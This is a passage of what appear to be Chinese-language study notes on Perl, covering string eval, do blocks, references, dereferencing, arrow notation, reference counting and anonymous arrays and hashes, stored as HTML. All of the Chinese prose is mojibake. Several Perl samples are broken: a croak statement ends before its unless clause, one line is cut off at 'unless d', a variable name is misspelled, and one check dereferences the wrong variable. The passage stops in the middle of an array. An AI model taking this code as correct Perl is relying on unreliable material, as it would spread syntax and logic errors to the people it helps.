id="3-3-ç”¨-eval-è¯­å¥å—åŠ¨æ€ç¼–è¯‘ä»£ç "><a href="#3-3-ç”¨-eval-è¯­å¥å—åŠ¨æ€ç¼–è¯‘ä»£ç " class="headerlink" title="3.3 ç”¨ eval è¯­å¥å—åŠ¨æ€ç¼–è¯‘ä»£ç "></a>3.3 ç”¨ eval è¯­å¥å—åŠ¨æ€ç¼–è¯‘ä»£ç </h2><p>eval è¯­å¥å—çš„ç¬¬äºŒç§å½¢å¼: å‚æ•°æ˜¯å­—ç¬¦ä¸²è¡¨è¾¾å¼è€Œä¸æ˜¯ä»£ç å—. åœ¨è¿è¡Œæ—¶é€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ç¼–è¯‘å’Œæ‰§è¡Œä»£ç . ä½†æ˜¯ä¸å»ºè®®å¯¹å­—ç¬¦ä¸²ä½¿ç”¨ eval è¯­å¥å—.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> <span class="hljs-string">&#x27;$sum = 2 + 2&#x27;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The sum is $sum\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Perl åœ¨è¯æ³•ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ eval è¯­å¥å—å‰åçš„ä»£ç , eval è¯­å¥å—çš„ç»“æœå³ä¸ºæœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼.</p><p>å¦‚æœ eval è¯­å¥å—ä¸èƒ½å¤Ÿæ­£ç¡®ç¼–è¯‘å¹¶ä¸”ä¸èƒ½æ­£ç¡®è¿è¡Œæˆ‘ä»¬ä¼ é€’çš„ Perl ä»£ç , åŒæ ·è®¾ç½® <code>$@</code> å˜é‡.</p><h2 id="3-4-ä½¿ç”¨-do-è¯­å¥å—"><a href="#3-4-ä½¿ç”¨-do-è¯­å¥å—" class="headerlink" title="3.4 ä½¿ç”¨ do è¯­å¥å—"></a>3.4 ä½¿ç”¨ do è¯­å¥å—</h2><p>do è¯­å¥æ‰§è¡Œçš„ç»“æœåŒæ ·æ˜¯æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼. do  è¯­å¥å¯ä»¥æŠŠä¸€ç»„è¯­å¥èšé›†ä¸ºå•ä¸ªè¡¨è¾¾å¼.</p><p>å¦‚, å°†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $bowler;<br><span class="hljs-keyword">if</span> (...) &#123;<br>    $bowler = <span class="hljs-string">&#x27;Mary Ann&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elsif</span> (...) &#123;<br>    $bowler = <span class="hljs-string">&#x27;Ginger&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    $bowler = <span class="hljs-string">&#x27;The Professor&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ do è¡¨è¾¾å¼å†™ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $bowler = <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (...) &#123; <span class="hljs-string">&#x27;Mary Ann&#x27;</span> &#125;<br>    <span class="hljs-keyword">elsif</span> (...) &#123; <span class="hljs-string">&#x27;Ginger&#x27;</span> &#125;<br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-string">&#x27;The Professor&#x27;</span> &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>do è¯­å¥é€‚åˆåˆ›å»ºä¸€ä¸ªæ“ä½œçš„ä½œç”¨åŸŸ</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $file_contents = <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">local</span> $/;<br>    <span class="hljs-keyword">local</span> @ARGV = ( $filename );<br>    &lt;&gt;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥å‘ do è¯­å¥å—æä¾›å­—ç¬¦ä¸²çš„å½¢å¼, å…¶ä¼šå°è¯•é€šè¿‡è¯¥å­—ç¬¦ä¸²åç§°åŠ è½½, ç¼–è¯‘æ–‡ä»¶:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">do</span> $filename;<br></code></pre></td></tr></table></figure><p>å†…ç½®çš„ <code>require</code> åŒæ ·ä¹Ÿå¯ç”¨äºåŠ è½½æ¨¡å—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">require</span> List::Util;<br></code></pre></td></tr></table></figure><p><code>use</code> è¯­å¥å®é™…ä¸Šæ˜¯ä¸€ä¸ª BEGIN å—ä¸­ <code>require</code> è¯­å¥å’Œè°ƒç”¨ç±»å¯¼å…¥çš„å†…å®¹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123;<br>    <span class="hljs-keyword">require</span> List::Util;<br>    List::Util-&gt;import(...);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¹ é¢˜"><a href="#ä¹ é¢˜" class="headerlink" title="ä¹ é¢˜"></a>ä¹ é¢˜</h2><p>åˆ¤æ–­æŸä¸ªæ¡ä»¶é”™è¯¯æ—¶æ‰§è¡ŒæŸä¸ªæ“ä½œä½¿ç”¨ <code>unless</code> æ¯”è¾ƒåˆé€‚.</p><p>ä»å¤–éƒ¨æ–‡ä»¶æˆ– STDIN è·å–è¾“å…¥æ—¶, æœ€å¥½ç”¨ <code>chomp</code> å»é™¤æ¢è¡Œç¬¦.</p><h1 id="ç¬¬4ç« -å¼•ç”¨ç®€ä»‹"><a href="#ç¬¬4ç« -å¼•ç”¨ç®€ä»‹" class="headerlink" title="ç¬¬4ç«  å¼•ç”¨ç®€ä»‹"></a>ç¬¬4ç«  å¼•ç”¨ç®€ä»‹</h1><h2 id="4-1-åœ¨å¤šä¸ªæ•°ç»„ä¸Šå®Œæˆç›¸åŒçš„ä»»åŠ¡"><a href="#4-1-åœ¨å¤šä¸ªæ•°ç»„ä¸Šå®Œæˆç›¸åŒçš„ä»»åŠ¡" class="headerlink" title="4.1 åœ¨å¤šä¸ªæ•°ç»„ä¸Šå®Œæˆç›¸åŒçš„ä»»åŠ¡"></a>4.1 åœ¨å¤šä¸ªæ•°ç»„ä¸Šå®Œæˆç›¸åŒçš„ä»»åŠ¡</h2><p>Perl çš„å‚æ•°åˆ—è¡¨æ˜¯ <code>@_</code> æ•°ç»„. ä¼ é€’å‚æ•°åŒæ ·é€šè¿‡æ‹¬å·.</p><h2 id="PeGS-Perl-å›¾å½¢ç»“æ„"><a href="#PeGS-Perl-å›¾å½¢ç»“æ„" class="headerlink" title="PeGS: Perl å›¾å½¢ç»“æ„"></a>PeGS: Perl å›¾å½¢ç»“æ„</h2><p>PeGS (Perl Graphical Structure). æ˜¯ Perl æ•°æ®ç»“æ„çš„å›¾å½¢è¡¨ç¤ºæ–¹å¼.</p><p>å¤§å¤šæ•° PeGS å›¾ç”±ä¸¤éƒ¨åˆ†ç»„æˆ: å˜é‡åç§°å’Œè¯¥å˜é‡å¼•ç”¨çš„æ•°æ®.</p><h2 id="4-3-å¯¹æ•°ç»„å–å¼•ç”¨"><a href="#4-3-å¯¹æ•°ç»„å–å¼•ç”¨" class="headerlink" title="4.3 å¯¹æ•°ç»„å–å¼•ç”¨"></a>4.3 å¯¹æ•°ç»„å–å¼•ç”¨</h2><p>åæ–œçº¿ <code>\</code> ç”¨äº â€œå–å¼•ç”¨â€ æ“ä½œ.</p><p>å¦‚, æ”¾åœ¨æ•°ç»„åç§°ä¹‹å‰ <code>\@skipper</code> å°±å¾—åˆ°è¯¥æ•°ç»„çš„å¼•ç”¨. å’Œ C ä¸­çš„æŒ‡é’ˆæœ‰äº›åŒºåˆ«, å¼•ç”¨æŒ‡å‘æ•´ä¸ªæ•°ç»„, è€Œä¸æ˜¯æ•°ç»„æœ¬èº«çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€.</p><p>å¼•ç”¨èƒ½å¤Ÿä½œä¸ºæ•°ç»„æˆ–è€…æ•£åˆ—çš„å…ƒç´ , ä¹Ÿèƒ½ç›´æ¥æ”¾å…¥æ™®é€šæ ‡é‡å˜é‡ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_skipper = \@skipper;<br></code></pre></td></tr></table></figure><p>å¼•ç”¨åŒæ ·æ˜¯æŒ‡å‘åœ°å€, å¼•ç”¨çš„æ•°å€¼å½¢å¼æ˜¯ <code>@skipper</code> æ•°ç»„åœ¨å†…éƒ¨æ•°æ®ç»“æ„ä¸­å”¯ä¸€çš„å†…å­˜åœ°å€, è¯¥åœ°å€åœ¨æ•°æ®çš„ç”Ÿå­˜åœ¨å‘¨æœŸå†…éƒ¨éƒ½ä¸ä¼šæ”¹å˜.</p><p>è‹¥æ˜¯ç›´æ¥å‘å­ä¾‹ç¨‹ä¼ é€’å‚æ•°, å®é™…ä¸Šæ˜¯å°†å‚æ•°éƒ½å¤åˆ¶äº†ä¸€é, è€Œä½¿ç”¨å¼•ç”¨åˆ™é¿å…äº†è¿™é‡Œçš„æ¶ˆè€—.</p><h2 id="4-4-å¯¹æ•°ç»„å¼•ç”¨è¿›è¡Œè§£å¼•ç”¨æ“ä½œ"><a href="#4-4-å¯¹æ•°ç»„å¼•ç”¨è¿›è¡Œè§£å¼•ç”¨æ“ä½œ" class="headerlink" title="4.4 å¯¹æ•°ç»„å¼•ç”¨è¿›è¡Œè§£å¼•ç”¨æ“ä½œ"></a>4.4 å¯¹æ•°ç»„å¼•ç”¨è¿›è¡Œè§£å¼•ç”¨æ“ä½œ</h2><p>è§£å¼•ç”¨å®é™…ä¸Šå°±æ˜¯å–åœ°å€ä¸Šçš„å€¼.</p><p>å¯ä»¥å°†æ•°ç»„çš„ä»»æ„å¼•ç”¨æ”¾å…¥å¤§æ‹¬å·ä¸­, ç”¨äºæ›¿æ¢æ•°ç»„åç§°, æœ€åä»¥iä¸€ä¸ªè®¿é—®åŸå§‹æ•°ç»„çš„æ–¹æ³•ä½œä¸ºç»“æŸ (ä¹Ÿå°±æ˜¯ç”¨å¤§æ‹¬å· â€œ{}â€ æ¥è§£å¼•ç”¨):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">@skipper<br>@&#123; $items &#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸¤ç§æ–¹æ³•éƒ½æŒ‡å‘æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">$skipper[<span class="hljs-number">1</span>]<br>$&#123; $items &#125;[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h2 id="4-5-å»é™¤å¤§æ‹¬å·"><a href="#4-5-å»é™¤å¤§æ‹¬å·" class="headerlink" title="4.5 å»é™¤å¤§æ‹¬å·"></a>4.5 å»é™¤å¤§æ‹¬å·</h2><p>å¦‚æœåªæ˜¯ä¸€ä¸ªç®€å•çš„æ ‡é‡å€¼, é‚£ä¹ˆä¹Ÿå¯åˆ é™¤ç¬¬ä¸€ç»„å¤§æ‹¬å·.</p><p>è§ä¹¦.</p><h2 id="4-6-ä¿®æ”¹æ•°ç»„"><a href="#4-6-ä¿®æ”¹æ•°ç»„" class="headerlink" title="4.6 ä¿®æ”¹æ•°ç»„"></a>4.6 ä¿®æ”¹æ•°ç»„</h2><p>ä¿®æ”¹è§£å¼•ç”¨çš„æ•°ç»„å°±æ˜¯ä¿®æ”¹åŸå§‹æ•°ç»„.</p><h2 id="4-7-åµŒå¥—çš„æ•°æ®ç»“æ„"><a href="#4-7-åµŒå¥—çš„æ•°æ®ç»“æ„" class="headerlink" title="4.7 åµŒå¥—çš„æ•°æ®ç»“æ„"></a>4.7 åµŒå¥—çš„æ•°æ®ç»“æ„</h2><h2 id="4-8-ç”¨ç®­å¤´ç®€åŒ–åµŒå¥—å…ƒç´ çš„å¼•ç”¨"><a href="#4-8-ç”¨ç®­å¤´ç®€åŒ–åµŒå¥—å…ƒç´ çš„å¼•ç”¨" class="headerlink" title="4.8 ç”¨ç®­å¤´ç®€åŒ–åµŒå¥—å…ƒç´ çš„å¼•ç”¨"></a>4.8 ç”¨ç®­å¤´ç®€åŒ–åµŒå¥—å…ƒç´ çš„å¼•ç”¨</h2><p>åœ¨ç¼–å†™ <code>$&#123;DUMMY&#125;[$y]</code> çš„ä»»ä½•åœ°æ–¹, éƒ½å¯ä»¥ä½¿ç”¨ <code>DUMMY-&gt;[$y]</code> è¿™ç§æ–¹å¼ä»£æ›¿.(å¼•ç”¨ä½äºç®­å¤´ä¹‹å‰)</p><p>é€šè¿‡åœ¨è¡¨è¾¾å¼åé¢ç”¨ä¸€ä¸ªç®­å¤´å’Œä¸€ä¸ªå¸¦æ–¹æ‹¬å·çš„ä¸‹æ ‡å®šä¹‰æ•°ç»„å¼•ç”¨, å°±å¯ä»¥é€‰å–æ•°ç»„ä¸­ä¸€ä¸ªç‰¹å®šçš„å…ƒç´ .</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$all_with_names[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>å¦ä¸€æ¡è§„åˆ™: å¦‚æœç®­å¤´ä½äº â€œä¸‹æ ‡ç±»çš„ç¬¦å·â€ ä¹‹é—´, ä¹Ÿå¯ä»¥åˆ é™¤è¿™äº›ç®­å¤´:</p><p>ä¾‹å¦‚(å«ä¹‰ä¸º, å…ˆè§£å¼•ç”¨ all_with_names è¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸‰ä¸ªå…ƒç´ , å†â€¦):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$all_with_names[<span class="hljs-number">2</span>]-&gt;[<span class="hljs-number">1</span>]-&gt;[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>å¯ä»¥è¡¨è¾¾ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$all_tith_names[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šæ˜¯æœ‰å‡ ä¸ª <code>[]</code> å°±æ˜¯å‡ é‡æ•°ç»„.</p><h2 id="4-9-æ•£åˆ—çš„å¼•ç”¨"><a href="#4-9-æ•£åˆ—çš„å¼•ç”¨" class="headerlink" title="4.9 æ•£åˆ—çš„å¼•ç”¨"></a>4.9 æ•£åˆ—çš„å¼•ç”¨</h2><p>åŒæ ·ä½¿ç”¨ <code>\</code> åæ–œçº¿ä½œä¸º â€œå–å¼•ç”¨â€ æ“ä½œç¬¦.</p><p>åŒæ ·æœ‰å¤§æ‹¬å·, ç®­å¤´å½¢å¼.</p><p>å¯¹äºæ•°ç»„åˆ‡ç‰‡æˆ–æ•£åˆ—åˆ‡ç‰‡, æ²¡æœ‰å¸¦ç®­å¤´ (-&gt;) çš„å¿«æ·æ–¹å¼.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> $crewmember (@crew) &#123;<br>    <span class="hljs-keyword">printf</span> $format, @$crewmember&#123;<span class="hljs-string">qw(name shirt hat position)</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-10-æ£€æŸ¥å¼•ç”¨ç±»å‹"><a href="#4-10-æ£€æŸ¥å¼•ç”¨ç±»å‹" class="headerlink" title="4.10 æ£€æŸ¥å¼•ç”¨ç±»å‹"></a>4.10 æ£€æŸ¥å¼•ç”¨ç±»å‹</h2><p>å¼€å§‹ä½¿ç”¨å’Œä¼ é€’å¼•ç”¨æ—¶, å¿…é¡»ç¡®ä¿çŸ¥é“æ­£åœ¨ä½¿ç”¨å“ªç§ç±»å‹çš„å¼•ç”¨.</p><p>æœ€ç®€å•çš„æ–¹å¼æ˜¯ä½¿ç”¨ <code>ref</code> å‡½æ•°.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Carp <span class="hljs-string">qw(croak)</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">show_hash</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $hash_ref = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $ref_type = <span class="hljs-keyword">ref</span> $hash_ref;<br>    croak <span class="hljs-string">&quot;I expected a hash reference!&quot;</span>;<br>        <span class="hljs-keyword">unless</span> $ref_type eq <span class="hljs-string">&#x27;HASH&#x27;</span>;<br><br>        <span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $key ( %$hash_ref ) &#123;<br>            ...<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ref</code> çš„è¿”å›å€¼æ˜¯ç±»å‹å, å¦‚ <code>HASH</code>.</p><p>constant å˜é‡æ„Ÿè§‰ç±»ä¼¼äº C ä¸­çš„å®å®šä¹‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> constant <span class="hljs-string">HASH =&gt;</span> <span class="hljs-keyword">ref</span> &#123;&#125;    <br><br>croak <span class="hljs-string">&quot;I expected a hash reference!&quot;</span><br>    <span class="hljs-keyword">unless</span> d<br></code></pre></td></tr></table></figure><p>Scalar::Util æ¨¡å—ä¸­çš„ <code>reftype</code> å‡½æ•°ä¹Ÿèƒ½å®Œæˆ <code>ref</code> å‡½æ•°çš„ä»»åŠ¡.</p><p>å¯ä»¥ä½¿ç”¨ eval æ£€æŸ¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">croak <span class="hljs-string">&quot;I expected a hash reference !&quot;</span><br>    <span class="hljs-keyword">unless</span> <span class="hljs-keyword">eval</span> &#123; <span class="hljs-keyword">keys</span> %$ref_type; <span class="hljs-number">1</span> &#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬5ç« -å¼•ç”¨å’Œä½œç”¨åŸŸ"><a href="#ç¬¬5ç« -å¼•ç”¨å’Œä½œç”¨åŸŸ" class="headerlink" title="ç¬¬5ç«  å¼•ç”¨å’Œä½œç”¨åŸŸ"></a>ç¬¬5ç«  å¼•ç”¨å’Œä½œç”¨åŸŸ</h1><p>èƒ½å¤Ÿåƒæ ‡é‡ä¸€æ ·å¤åˆ¶å¹¶ä¸”ä¼ é€’å¼•ç”¨.</p><h2 id="5-1-å…³äºæ•°æ®å¼•ç”¨çš„æ›´å¤šä¿¡æ¯"><a href="#5-1-å…³äºæ•°æ®å¼•ç”¨çš„æ›´å¤šä¿¡æ¯" class="headerlink" title="5.1 å…³äºæ•°æ®å¼•ç”¨çš„æ›´å¤šä¿¡æ¯"></a>5.1 å…³äºæ•°æ®å¼•ç”¨çš„æ›´å¤šä¿¡æ¯</h2><p>Perl é€šè¿‡ä¸€ä¸ªå«åš â€œå¼•ç”¨è®¡æ•°â€ çš„æœºåˆ¶è¿½è¸ªæœ‰å¤šå°‘ä¸­è®¿é—®æ•°æ®çš„æ–¹æ³•.</p><p>æœ‰äº†åˆå§‹åç§°, å¼•ç”¨è®¡æ•°å°±ä¸º 1.</p><p>å¯ä»¥éšæ„æ·»åŠ å’Œåˆ é™¤å¼•ç”¨, å¹¶ä¸”åªè¦å¼•ç”¨è®¡æ•°æ²¡æœ‰å‡å°‘åˆ° 0. Perl å°±å°†åœ¨å†…å­˜ä¸­ä¿å­˜è¯¥æ•°ç»„.</p><p>é”€æ¯å¼•ç”¨, å¯ä»¥æŠŠ undef èµ‹ç»™è¯¥å˜é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ref_to_skipper = <span class="hljs-keyword">undef</span>;<br></code></pre></td></tr></table></figure><p>ç‰¹æ®Šæƒ…å†µä¸‹, ä¿å­˜åœ¨å­ä¾‹ç¨‹çš„ç§æœ‰ (è¯æ³•) å˜é‡ä¸­çš„å¼•ç”¨, å°†ä¼šåœ¨å­ä¾‹ç¨‹çš„ç»“å°¾é”€æ¯.</p><p>ä»…å½“æ‰€æœ‰å¼•ç”¨é”€æ¯æ—¶, Perl æ‰ä¼šå›æ”¶æ•°ç»„å ç”¨çš„å†…å­˜.</p><h2 id="5-2-å¦‚æœå®ƒæ›¾æ˜¯å˜é‡åå°†ä¼šæ€æ ·"><a href="#5-2-å¦‚æœå®ƒæ›¾æ˜¯å˜é‡åå°†ä¼šæ€æ ·" class="headerlink" title="5.2 å¦‚æœå®ƒæ›¾æ˜¯å˜é‡åå°†ä¼šæ€æ ·"></a>5.2 å¦‚æœå®ƒæ›¾æ˜¯å˜é‡åå°†ä¼šæ€æ ·</h2><h2 id="5-3-å¼•ç”¨è®¡æ•°å’ŒåµŒå¥—æ•°æ®ç»“æ„"><a href="#5-3-å¼•ç”¨è®¡æ•°å’ŒåµŒå¥—æ•°æ®ç»“æ„" class="headerlink" title="5.3 å¼•ç”¨è®¡æ•°å’ŒåµŒå¥—æ•°æ®ç»“æ„"></a>5.3 å¼•ç”¨è®¡æ•°å’ŒåµŒå¥—æ•°æ®ç»“æ„</h2><p>åˆ é™¤æ•°æ®æ ‘é¡¶ç«¯çš„èŠ‚ç‚¹é€šå¸¸å°±æ„å‘³ç€åˆ é™¤è¯¥æ•°æ®æ ‘åŒ…å«çš„æ‰€æœ‰æ•°æ®.</p><p>Perl ä¼šä¿è¯, å¦‚æœæˆ‘ä»¬ä»ç„¶æ‹¥æœ‰ä¸€ä¸ªæŒ‡å‘æ•°æ®çš„å¼•ç”¨, å°±å°†ä»ç„¶æ‹¥æœ‰è¯¥æ•°æ®.</p><h2 id="5-4-å½“å¼•ç”¨è®¡æ•°å‡ºç°é—®é¢˜æ—¶"><a href="#5-4-å½“å¼•ç”¨è®¡æ•°å‡ºç°é—®é¢˜æ—¶" class="headerlink" title="5.4 å½“å¼•ç”¨è®¡æ•°å‡ºç°é—®é¢˜æ—¶"></a>5.4 å½“å¼•ç”¨è®¡æ•°å‡ºç°é—®é¢˜æ—¶</h2><p>å½“æ•°æ®ç»“æ„ä¸­çš„ä¸€éƒ¨åˆ†ä»¥å¾ªç¯çš„æ–¹å¼æŒ‡å‘æ•°æ®ç»“æ„çš„å…¶ä»–éƒ¨åˆ†æ—¶, å°±ä¼šå‡ºç°é—®é¢˜.</p><h2 id="5-5-ç›´æ¥åˆ›å»ºåŒ¿åæ•°ç»„"><a href="#5-5-ç›´æ¥åˆ›å»ºåŒ¿åæ•°ç»„" class="headerlink" title="5.5 ç›´æ¥åˆ›å»ºåŒ¿åæ•°ç»„"></a>5.5 ç›´æ¥åˆ›å»ºåŒ¿åæ•°ç»„</h2><p>ä½¿ç”¨æ–¹æ‹¬å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_skipper_provisions = <br>    [ <span class="hljs-string">qw(blue_shirt hat jacket preserver sunscreen)</span> ];<br></code></pre></td></tr></table></figure><p>å–æ–¹æ‹¬å·å†…çš„å€¼ (åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­æ±‚å€¼), ä¸ºè¿™äº›å…ƒç´ åˆ›å»ºä¸€ä¸ªæ–°çš„åŒ¿åæ•°ç»„, å¹¶ä¸”è¿”å›è¯¥æ•°ç»„çš„å¼•ç”¨.</p><p>ä½¿ç”¨æ–¹æ‹¬å·åŒ¿åæ•°ç»„æ„é€ å‡½æ•°å¾—åˆ°çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„å¼•ç”¨, è¯¥å¼•ç”¨é€‚ç”¨äºæ ‡é‡å˜é‡é€‚ç”¨çš„æ‰€æœ‰åœºåˆ.</p><p>åˆ›å»ºæ›´å¤§çš„åˆ—è¡¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_skipper_provisions = <br>    [ <span class="hljs-string">qw(blue_shirt hat jacket preserver sunscreen)</span> ];<br>    <span class="hljs-keyword">my</span> @skipper_with_name = (<span class="hljs-string">&#x27;The Skipper&#x27;</span>, $ref_to_skipper_provisions);<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åŒ¿åæ•°ç»„çš„å¥½å¤„åœ¨äºä¸ç”¨è®°å¿†ä¸­é—´åç§°.</p><p>å¯ä»¥ç”¨ç©ºçš„åŒ¿åæ•°ç»„æ„é€ å™¨å‡½æ•°è¡¨ç¤ºç©ºçš„åŒ¿åæ•°ç»„å¼•ç”¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">[<span class="hljs-string">&#x27;Mrs. Howell&#x27;</span>, <br>  [  ]<br>],<br></code></pre></td></tr></table></figure><h2 id="5-6-åˆ›å»ºåŒ¿åæ•£åˆ—"><a href="#5-6-åˆ›å»ºåŒ¿åæ•£åˆ—" class="headerlink" title="5.6 åˆ›å»ºåŒ¿åæ•£åˆ—"></a>5.6 åˆ›å»ºåŒ¿åæ•£åˆ—</h2><p>å¤§æ‹¬å· <code>&#123;&#125;</code> æ˜¯åŒ¿åæ•£åˆ—æ„é€ å‡½æ•°.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_gilligan_info = &#123;<br>    <span class="hljs-string">name     =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>    <span class="hljs-string">hat      =&gt;</span> <span class="hljs-string">&#x27;White&#x27;</span>,<br>    <span class="hljs-string">shirt    =&gt;</span> <span class="hljs-string">&#x27;Red&#x27;</span>,<br>    <span class="hljs-string">position =&gt;</span> <span class="hljs-string">&#x27;First Mate&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„, å½“åˆ—è¡¨æœ«å°¾çš„å…ƒç´ å¹¶éç´§è·Ÿç€å³èŠ±æ‹¬å·, æ–¹æ‹¬å·æˆ–å°æ‹¬å·æ—¶, å¯ä»¥ä»¥é€—å·ç»“å°¾.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @crew = (<br>    &#123;<br>        <span class="hljs-string">name       =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>        <span class="hljs-string">hat        =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>        <span class="hljs-string">shirt      =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>        <span class="hljs-string">position   =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>    &#125;,<br>    &#123;<br>        <span class="hljs-string">name       =&gt;</span> <span class="hljs-string">&#x27;Skipper&#x27;</span>,<br>        <span class="hljs-string">hat        =&gt;</span> <span class="hljs-string">&#x27;Black&#x27;</span>,<br>   